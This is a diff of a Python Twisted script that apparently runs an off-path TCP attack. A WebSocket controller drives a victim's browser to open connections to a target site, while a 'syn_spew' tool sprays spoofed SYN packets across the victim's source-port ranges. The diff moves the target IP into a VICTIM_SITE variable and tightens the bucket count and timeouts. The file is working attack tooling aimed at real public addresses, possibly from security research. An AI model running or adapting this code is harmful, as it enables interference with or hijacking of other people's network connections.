@@ -33,11 +33,12 @@ class WebSocketServerFactory(Factory):
         return p
 
 
-NUM_BUCKETS = 50
+NUM_BUCKETS = 20
 LOW_PORT = 32768
 HIGH_PORT = 61000
-TEST_VICTIM_IP = '192.168.1.107'
 PORT_BUCKET_SIZE = (HIGH_PORT - LOW_PORT) / NUM_BUCKETS
+TEST_VICTIM_IP = '192.168.1.113'
+VICTIM_SITE = '66.220.149.11'
 
 class ControlWebSocket(Protocol):
     """
@@ -67,7 +68,7 @@ class ControlWebSocket(Protocol):
         #subprocess.call(['./syn_spew', '-p', '%d-%d' % (low_port, high_port), \
         #                 '-r', '100', '-d', '100', self.addr.host, '69.171.242.11:80'])
         os.execvp('./syn_spew', ['./syn_spew', '-p', '%d-%d' % (low_port, high_port), \
-                                '-r', '0', '-d', '100', TEST_VICTIM_IP, '69.171.242.11:80'])
+                                '-r', '0', '-d', '100', TEST_VICTIM_IP, '%s:80' % (VICTIM_SITE)])
         #sys.exit(0)
 
 
@@ -123,7 +124,7 @@ class ControlWebSocket(Protocol):
 
     def cleanupOldWebsocket(self):
         subprocess.call(['./syn_spew', '-R', '-p', '%d-%d' % (self.min_port, self.mid_port), \
-                         '-r', '3', '-d', '100', TEST_VICTIM_IP, '69.171.242.11:80'])
+                         '-r', '3', '-d', '100', TEST_VICTIM_IP, '%s:80' % (VICTIM_SITE)])
         print 'done'
 
         if self.bucket_search:
@@ -135,8 +136,7 @@ class ControlWebSocket(Protocol):
         else:
             self.adjustBucket(True)
         
-        print 'calling fireagain from cleanupOldWebsocket in 0.2....'
-        reactor.callLater(0.2, self.fireAgain)
+        reactor.callLater(0.1, self.fireAgain)
  
 
     def websocketTimeout(self):
@@ -168,11 +168,14 @@ class ControlWebSocket(Protocol):
 
         self.spawnSpewer(self.min_port, self.mid_port)
 
-        self.transport.write("show <b>testing %d - %d...</b>" % ( self.min_port, self.mid_port))
-        self.transport.write("make ws://69.171.242.11/") 
+        testing = "testing"
+        if self.bucket_search:
+            testing = "(bucket) testing"
+        self.transport.write("show <b>%s %d - %d...</b>" % (testing, self.min_port, self.mid_port))
+        self.transport.write("make ws://%s/" % (VICTIM_SITE)) 
 
         self.fire_time = time.time()
-        self.websocketTimeoutCb = reactor.callLater(2, self.websocketTimeout)
+        self.websocketTimeoutCb = reactor.callLater(1, self.websocketTimeout)
         
 
     def dataReceived(self, data):
